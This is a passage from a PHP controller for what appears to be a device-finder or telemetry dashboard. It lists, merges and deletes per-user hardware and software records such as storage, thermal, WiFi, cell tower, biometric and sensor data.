            'rows' => $this->finderModel->get_display_info($this->userId),
            'total' => $this->finderModel->get_count_DisplayInfo($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/display_info', $data);
    }

    /** POST /advanced/hardware/display_info/delete/(:num) */
    public function delete_display_info($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_display_info_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/hardware/storage */
    public function storage()
    {
        $data = array_merge($this->commonData('storage', 'Storage'), [
            'rows' => $this->finderModel->get_storage($this->userId),
            'total' => $this->finderModel->get_count_Storage($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/storage', $data);
    }

    /** POST /advanced/hardware/storage/delete/(:num) */
    public function delete_storage($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_storage_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/hardware/thermal */
    public function thermal()
    {
        $data = array_merge($this->commonData('thermal', 'Thermal'), [
            'rows' => $this->finderModel->get_thermal($this->userId),
            'total' => $this->finderModel->get_count_Thermal($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/thermal', $data);
    }

    /** POST /advanced/hardware/thermal/delete/(:num) */
    public function delete_thermal($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_thermal_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/hardware/nfc */
    public function nfc()
    {
        $data = array_merge($this->commonData('nfc', 'NFC'), [
            'rows' => $this->finderModel->get_nfc($this->userId),
            'total' => $this->finderModel->get_count_Nfc($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/nfc', $data);
    }

    /** POST /advanced/hardware/nfc/delete/(:num) */
    public function delete_nfc($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_nfc_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/hardware/hardware_graphics */
    public function hardware_graphics()
    {
        $data = array_merge($this->commonData('hardware_graphics', 'Hardware Graphics'), [
            'rows' => $this->finderModel->get_hardware_graphics($this->userId),
            'total' => $this->finderModel->get_count_HardwareGraphics($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/hardware_graphics', $data);
    }

    /** POST /advanced/hardware/hardware_graphics/delete/(:num) */
    public function delete_hardware_graphics($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_hardware_graphics_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    // ── NEW EXTRACTORS: Software ──

    /** GET /advanced/software/data_usage */
    public function data_usage()
    {
        $data = array_merge($this->commonData('data_usage', 'Data Usage'), [
            'rows' => $this->finderModel->get_data_usage($this->userId),
            'total' => $this->finderModel->get_count_DataUsage($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/data_usage', $data);
    }

    /** POST /advanced/software/data_usage/delete/(:num) */
    public function delete_data_usage($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_data_usage_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/software/saved_wifi */
    public function saved_wifi()
    {
        $data = array_merge($this->commonData('saved_wifi', 'Saved WiFi'), [
            'rows' => $this->finderModel->get_saved_wifi($this->userId),
            'total' => $this->finderModel->get_count_SavedWifi($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/saved_wifi', $data);
    }

    /** POST /advanced/software/saved_wifi/delete/(:num) */
    public function delete_saved_wifi($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_saved_wifi_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/software/default_apps */
    public function default_apps()
    {
        $data = array_merge($this->commonData('default_apps', 'Default Apps'), [
            'rows' => $this->finderModel->get_default_apps($this->userId),
            'total' => $this->finderModel->get_count_DefaultApps($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/default_apps', $data);
    }

    /** POST /advanced/software/default_apps/delete/(:num) */
    public function delete_default_apps($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_default_apps_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/software/alarms */
    public function alarms()
    {
        $data = array_merge($this->commonData('alarms', 'Alarms & Jobs'), [
            'rows' => $this->finderModel->get_alarms($this->userId),
            'total' => $this->finderModel->get_count_Alarms($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/alarms', $data);
    }

    /** POST /advanced/software/alarms/delete/(:num) */
    public function delete_alarms($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_alarms_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    // ── Hardware Network ──
    public function hardware_network()
    {
        $data = array_merge($this->commonData('hardware_network', 'Network Hardware'), [
            'rows' => $this->finderModel->get_hardware_network($this->userId),
            'total' => $this->finderModel->get_count_HardwareNetwork($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/hardware_network', $data);
    }

    public function delete_hardware_network($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_hardware_network_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    // ── Misc Hardware Detail Extractors ──

    /** GET /advanced/hardware/audio_devices */
    public function audio_devices()
    {
        $data = array_merge($this->commonData('audio_devices', 'Audio Devices'), [
            'rows' => $this->finderModel->get_audio_devices($this->userId),
            'total' => $this->finderModel->get_count_AudioDevices($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/audio_devices', $data);
    }

    public function delete_audio_devices($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_audio_devices_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/hardware/biometric */
    public function biometric()
    {
        $data = array_merge($this->commonData('biometric', 'Biometric'), [
            'rows' => $this->finderModel->get_biometric($this->userId),
            'total' => $this->finderModel->get_count_Biometric($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/biometric', $data);
    }

    public function delete_biometric($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_biometric_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/hardware/gnss_hardware */
    public function gnss_hardware()
    {
        $data = array_merge($this->commonData('gnss_hardware', 'GNSS Hardware'), [
            'rows' => $this->finderModel->get_gnss_hardware($this->userId),
            'total' => $this->finderModel->get_count_GnssHardware($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/gnss_hardware', $data);
    }

    public function delete_gnss_hardware($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_gnss_hardware_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/hardware/power_rails */
    public function power_rails()
    {
        $data = array_merge($this->commonData('power_rails', 'Power Rails'), [
            'rows' => $this->finderModel->get_power_rails($this->userId),
            'total' => $this->finderModel->get_count_PowerRails($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/power_rails', $data);
    }

    public function delete_power_rails($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_power_rails_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/hardware/usb_devices */
    public function usb_devices()
    {
        $data = array_merge($this->commonData('usb_devices', 'USB Devices'), [
            'rows' => $this->finderModel->get_usb_devices($this->userId),
            'total' => $this->finderModel->get_count_UsbDevices($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/usb_devices', $data);
    }

    public function delete_usb_devices($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_usb_devices_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/hardware/vibration */
    public function vibration()
    {
        $data = array_merge($this->commonData('vibration', 'Vibration'), [
            'rows' => $this->finderModel->get_vibration($this->userId),
            'total' => $this->finderModel->get_count_Vibration($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/vibration', $data);
    }

    public function delete_vibration($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_vibration_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    // ═══════════════════════════════════════════════════════════════
    // MERGED HARDWARE PAGES
    // ═══════════════════════════════════════════════════════════════

    private function getTimestampColumn(string $table): string
    {
        return match ($table) {
            'tbl_device_profiles' => 'extraction_timestamp',
            default => 'extracted_at',
        };
    }

    private function getLatestRecord(string $table, int $userId): ?array
    {
        $tsCol = $this->getTimestampColumn($table);
        $db = \Config\Database::connect();
        return $db->table($table)
            ->where('owner_id', $userId)
            ->orderBy($tsCol, 'DESC')
            ->limit(1)
            ->get()
            ->getRowArray();
    }

    private function getMergedHistory(string $mainTable, array $joinTables, int $userId, int $perPage = 50): array
    {
        $db = \Config\Database::connect();
        $page = service('request')->getGet('page') ?? 1;
        $offset = ($page - 1) * $perPage;
        $tsCol = $this->getTimestampColumn($mainTable);

        $timestamps = $db->table("{$mainTable} m")
            ->where('owner_id', $userId)
            ->select("DISTINCT {$tsCol}", false)
            ->orderBy($tsCol, 'DESC')
            ->limit($perPage, $offset)
            ->get()
            ->getResultArray();

        if (empty($timestamps)) {
            return [];
        }

        $tsList = array_column($timestamps, $tsCol);
        $results = [];
        foreach ($tsList as $ts) {
            $row = ['extracted_at' => $ts];
            foreach ($joinTables as $alias => $table) {
                $joinTsCol = $this->getTimestampColumn($table);
                $record = $db->table("{$table} {$alias}")
                    ->where('owner_id', $userId)
                    ->where("{$joinTsCol} <=", $ts)
                    ->orderBy($joinTsCol, 'DESC')
                    ->limit(1)
                    ->get()
                    ->getRowArray();
                $row[$alias] = $record ?: [];
            }
            $results[] = $row;
        }

        return $results;
    }

    private function getMergedHistoryCount(string $mainTable, int $userId): int
    {
        $db = \Config\Database::connect();
        return (int) $db->table($mainTable)
            ->where('owner_id', $userId)
            ->countAllResults();
    }

    /** GET /advanced/hardware/dashboard */
    public function hardware_dashboard()
    {
        $userId = $this->userId;
        $latest_dc = $this->getLatestRecord('tbl_device_hardware_contexts', $userId);
        $latest_bs = $this->getLatestRecord('tbl_telemetry_battery_stats', $userId);
        $latest_th = $this->getLatestRecord('tbl_telemetry_thermal', $userId);
        $latest_st = $this->getLatestRecord('tbl_telemetry_storage_stats', $userId);
        $latest_ni = $this->getLatestRecord('tbl_system_network_info', $userId);

        $history = $this->getMergedHistory('tbl_device_hardware_contexts', [
            'dc' => 'tbl_device_hardware_contexts',
            'bs' => 'tbl_telemetry_battery_stats',
            'th' => 'tbl_telemetry_thermal',
            'st' => 'tbl_telemetry_storage_stats',
            'ni' => 'tbl_system_network_info',
        ], $userId);

        $total = $this->getMergedHistoryCount('tbl_device_hardware_contexts', $userId);
        $pager = service('pager');
        $pager->makeLinks(service('request')->getGet('page') ?? 1, 50, $total, 'bootstrap5_full');

        $data = array_merge($this->commonData('hardware_dashboard', 'Hardware Dashboard'), [
            'latest_dc' => $latest_dc,
            'latest_bs' => $latest_bs,
            'latest_th' => $latest_th,
            'latest_st' => $latest_st,
            'latest_ni' => $latest_ni,
            'history' => $history,
            'total' => $total,
            'pager' => $pager,
        ]);

        return $this->renderAppView('users/advanced/hardware_dashboard', $data);
    }

    /** GET /advanced/hardware/battery_power */
    public function battery_power()
    {
        $userId = $this->userId;
        $latest_dc = $this->getLatestRecord('tbl_device_hardware_contexts', $userId);
        $latest_bs = $this->getLatestRecord('tbl_telemetry_battery_stats', $userId);

        $history = $this->getMergedHistory('tbl_device_hardware_contexts', [
            'dc' => 'tbl_device_hardware_contexts',
            'bs' => 'tbl_telemetry_battery_stats',
        ], $userId);

        $total = $this->getMergedHistoryCount('tbl_device_hardware_contexts', $userId);
        $pager = service('pager');
        $pager->makeLinks(service('request')->getGet('page') ?? 1, 50, $total, 'bootstrap5_full');

        $data = array_merge($this->commonData('battery_power', 'Battery & Power'), [
            'latest_dc' => $latest_dc,
            'latest_bs' => $latest_bs,
            'latest' => [
                'device_context' => $latest_dc,
                'battery_stats' => $latest_bs,
            ],
            'history' => $history,
            'total' => $total,
            'pager' => $pager,
        ]);

        return $this->renderAppView('users/advanced/battery_power', $data);
    }

    /** GET /advanced/hardware/system_performance */
    public function system_performance()
    {
        $userId = $this->userId;
        $latest_pi = $this->getLatestRecord('tbl_system_running_processes', $userId);
        $latest_th = $this->getLatestRecord('tbl_telemetry_thermal', $userId);
        $latest_pr = $this->getLatestRecord('tbl_telemetry_power_rails', $userId);

        $history = $this->getMergedHistory('tbl_system_running_processes', [
            'pi' => 'tbl_system_running_processes',
            'th' => 'tbl_telemetry_thermal',
            'pr' => 'tbl_telemetry_power_rails',
        ], $userId);

        $total = $this->getMergedHistoryCount('tbl_system_running_processes', $userId);
        $pager = service('pager');
        $pager->makeLinks(service('request')->getGet('page') ?? 1, 50, $total, 'bootstrap5_full');

        $data = array_merge($this->commonData('system_performance', 'System Performance'), [
            'latest_proc' => $latest_pi,
            'latest_th' => $latest_th,
            'latest_pr' => $latest_pr,
            'latest' => [
                'proc_info' => $latest_pi,
                'thermal' => $latest_th,
                'power_rails' => $latest_pr,
            ],
            'history' => $history,
            'total' => $total,
            'pager' => $pager,
        ]);

        return $this->renderAppView('users/advanced/system_performance', $data);
    }

    /** GET /advanced/hardware/network_connectivity */
    public function network_connectivity()
    {
        $userId = $this->userId;
        $latest_ni = $this->getLatestRecord('tbl_system_network_info', $userId);
        $latest_nh = $this->getLatestRecord('tbl_hardware_network', $userId);
        $latest_ct = $this->getLatestRecord('tbl_telemetry_cell_towers', $userId);

        $history = $this->getMergedHistory('tbl_system_network_info', [
            'ni' => 'tbl_system_network_info',
            'nh' => 'tbl_hardware_network',
            'ct' => 'tbl_telemetry_cell_towers',
        ], $userId);

        $total = $this->getMergedHistoryCount('tbl_system_network_info', $userId);
        $pager = service('pager');
        $pager->makeLinks(service('request')->getGet('page') ?? 1, 50, $total, 'bootstrap5_full');

        $data = array_merge($this->commonData('network_connectivity', 'Network & Connectivity'), [
            'latest_ni' => $latest_ni,
            'latest_nh' => $latest_nh,
            'latest_ct' => $latest_ct,
            'latest' => [
                'network_info' => $latest_ni,
                'hardware_network' => $latest_nh,
                'cell_towers' => $latest_ct,
            ],
            'history' => $history,
            'total' => $total,
            'pager' => $pager,
        ]);

        return $this->renderAppView('users/advanced/network_connectivity', $data);
    }

    /** GET /advanced/hardware/display_graphics */
    public function display_graphics()
    {
        $userId = $this->userId;
        $latest_di = $this->getLatestRecord('tbl_telemetry_display_info', $userId);
        $latest_hg = $this->getLatestRecord('tbl_hardware_graphics', $userId);

        $history = $this->getMergedHistory('tbl_telemetry_display_info', [
            'di' => 'tbl_telemetry_display_info',
            'hg' => 'tbl_hardware_graphics',
        ], $userId);

        $total = $this->getMergedHistoryCount('tbl_telemetry_display_info', $userId);
        $pager = service('pager');
        $pager->makeLinks(service('request')->getGet('page') ?? 1, 50, $total, 'bootstrap5_full');

        $data = array_merge($this->commonData('display_graphics', 'Display & Graphics'), [
            'latest_di' => $latest_di,
            'latest_hg' => $latest_hg,
            'history' => $history,
            'total' => $total,
            'pager' => $pager,
        ]);

        return $this->renderAppView('users/advanced/display_graphics', $data);
    }

    /** GET /advanced/hardware/sensors_location */
    public function sensors_location()
    {
        $userId = $this->userId;
        $latest_sp = $this->getLatestRecord('tbl_telemetry_sensors', $userId);
        $latest_gh = $this->getLatestRecord('tbl_telemetry_gnss_hardware', $userId);
        $latest_vb = $this->getLatestRecord('tbl_telemetry_vibration', $userId);

        $history = $this->getMergedHistory('tbl_telemetry_sensors', [
            'sp' => 'tbl_telemetry_sensors',
            'gh' => 'tbl_telemetry_gnss_hardware',
            'vb' => 'tbl_telemetry_vibration',
        ], $userId);

        $total = $this->getMergedHistoryCount('tbl_telemetry_sensors', $userId);
        $pager = service('pager');
        $pager->makeLinks(service('request')->getGet('page') ?? 1, 50, $total, 'bootstrap5_full');

        $data = array_merge($this->commonData('sensors_location', 'Sensors & Location'), [
            'latest_sp' => $latest_sp,
            'latest_gh' => $latest_gh,
            'latest_vb' => $latest_vb,
            'history' => $history,
            'total' => $total,
            'pager' => $pager,
        ]);

        return $this->renderAppView('users/advanced/sensors_location', $data);
    }

    /** GET /advanced/hardware/media_hardware */
    public function media_hardware()
    {
        $userId = $this->userId;
        $latest_ci = $this->getLatestRecord('tbl_telemetry_cameras', $userId);
        $latest_ad = $this->getLatestRecord('tbl_telemetry_audio_devices', $userId);

        $history = $this->getMergedHistory('tbl_telemetry_cameras', [
            'ci' => 'tbl_telemetry_cameras',
            'ad' => 'tbl_telemetry_audio_devices',
        ], $userId);

        $total = $this->getMergedHistoryCount('tbl_telemetry_cameras', $userId);
        $pager = service('pager');
        $pager->makeLinks(service('request')->getGet('page') ?? 1, 50, $total, 'bootstrap5_full');

        $data = array_merge($this->commonData('media_hardware', 'Media Hardware'), [
            'latest_ci' => $latest_ci,
            'latest_ad' => $latest_ad,
            'history' => $history,
            'total' => $total,
            'pager' => $pager,
        ]);

        return $this->renderAppView('users/advanced/media_hardware', $data);
    }

    /** GET /advanced/hardware/storage_peripherals */
    public function storage_peripherals()
    {
        $userId = $this->userId;
        $latest_st = $this->getLatestRecord('tbl_telemetry_storage_stats', $userId);
        $latest_ud = $this->getLatestRecord('tbl_telemetry_usb_devices', $userId);

        $history = $this->getMergedHistory('tbl_telemetry_storage_stats', [
            'st' => 'tbl_telemetry_storage_stats',
            'ud' => 'tbl_telemetry_usb_devices',
        ], $userId);

        $total = $this->getMergedHistoryCount('tbl_telemetry_storage_stats', $userId);
        $pager = service('pager');
        $pager->makeLinks(service('request')->getGet('page') ?? 1, 50, $total, 'bootstrap5_full');

        $data = array_merge($this->commonData('storage_peripherals', 'Storage & Peripherals'), [
            'latest_st' => $latest_st,
            'latest_ud' => $latest_ud,
            'history' => $history,
            'total' => $total,
            'pager' => $pager,
        ]);

        return $this->renderAppView('users/advanced/storage_peripherals', $data);
    }

    /** GET /advanced/hardware/shortrange_auth */
    public function shortrange_auth()
    {
        $userId = $this->userId;
        $latest_bt = $this->getLatestRecord('tbl_telemetry_bluetooth_devices', $userId);
        $latest_nf = $this->getLatestRecord('tbl_telemetry_nfc', $userId);
        $latest_bm = $this->getLatestRecord('tbl_biometric', $userId);

        $history = $this->getMergedHistory('tbl_telemetry_bluetooth_devices', [
            'bt' => 'tbl_telemetry_bluetooth_devices',
            'nf' => 'tbl_telemetry_nfc',
            'bm' => 'tbl_biometric',
        ], $userId);

        $total = $this->getMergedHistoryCount('tbl_telemetry_bluetooth_devices', $userId);
        $pager = service('pager');
        $pager->makeLinks(service('request')->getGet('page') ?? 1, 50, $total, 'bootstrap5_full');

        $data = array_merge($this->commonData('shortrange_auth', 'Short-Range & Auth'), [
            'latest_bt' => $latest_bt,
            'latest_nf' => $latest_nf,
            'latest_bm' => $latest_bm,
            'history' => $history,
            'total' => $total,
            'pager' => $pager,
        ]);

        return $this->renderAppView('users/advanced/shortrange_auth', $data);
    }

    /** GET /advanced/hardware/device_fingerprint */
    public function device_fingerprint()
    {
        $userId = $this->userId;
        $latest_dp = $this->getLatestRecord('tbl_device_profiles', $userId);
        $latest_hg = $this->getLatestRecord('tbl_hardware_graphics', $userId);
        $latest_sp = $this->getLatestRecord('tbl_telemetry_sensors', $userId);
        $latest_ci = $this->getLatestRecord('tbl_telemetry_cameras', $userId);

        $history = $this->getMergedHistory('tbl_device_profiles', [
            'dp' => 'tbl_device_profiles',
            'hg' => 'tbl_hardware_graphics',
            'sp' => 'tbl_telemetry_sensors',
            'ci' => 'tbl_telemetry_cameras',
        ], $userId);

        $total = $this->getMergedHistoryCount('tbl_device_profiles', $userId);
        $pager = service('pager');
        $pager->makeLinks(service('request')->getGet('page') ?? 1, 50, $total, 'bootstrap5_full');

        $data = array_merge($this->commonData('device_fingerprint', 'Device Fingerprint'), [
            'latest_dp' => $latest_dp,
            'latest_hg' => $latest_hg,
            'latest_sp' => $latest_sp,
            'latest_ci' => $latest_ci,
            'history' => $history,
            'total' => $total,
            'pager' => $pager,
        ]);

        return $this->renderAppView('users/advanced/device_fingerprint', $data);
    }

    // ── Merged Hardware Delete Methods ──

    /** POST /advanced/hardware/hardware_dashboard/delete/(:num) */
    public function delete_hardware_dashboard($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_device_context_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** POST /advanced/hardware/battery_power/delete/(:num) */
    public function delete_battery_power($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_battery_stats_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** POST /advanced/hardware/system_performance/delete/(:num) */
    public function delete_system_performance($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_proc_info_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** POST /advanced/hardware/network_connectivity/delete/(:num) */
    public function delete_network_connectivity($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_network_info_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** POST /advanced/hardware/display_graphics/delete/(:num) */
    public function delete_display_graphics($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_display_info_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** POST /advanced/hardware/sensors_location/delete/(:num) */
    public function delete_sensors_location($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_sensor_profile((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** POST /advanced/hardware/media_hardware/delete/(:num) */
    public function delete_media_hardware($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_camera_info_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** POST /advanced/hardware/storage_peripherals/delete/(:num) */
    public function delete_storage_peripherals($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_storage_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** POST /advanced/hardware/shortrange_auth/delete/(:num) */
    public function delete_shortrange_auth($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_bluetooth_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** POST /advanced/hardware/device_fingerprint/delete/(:num) */
    public function delete_device_fingerprint($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_device_profile_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    // ── App Security ──
    public function app_security()
    {
        $data = array_merge($this->commonData('app_security', 'App Security'), [
            'rows' => $this->finderModel->get_app_security($this->userId),
            'total' => $this->finderModel->get_count_AppSecurity($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/app_security', $data);
    }

    public function delete_app_security($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_app_security_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

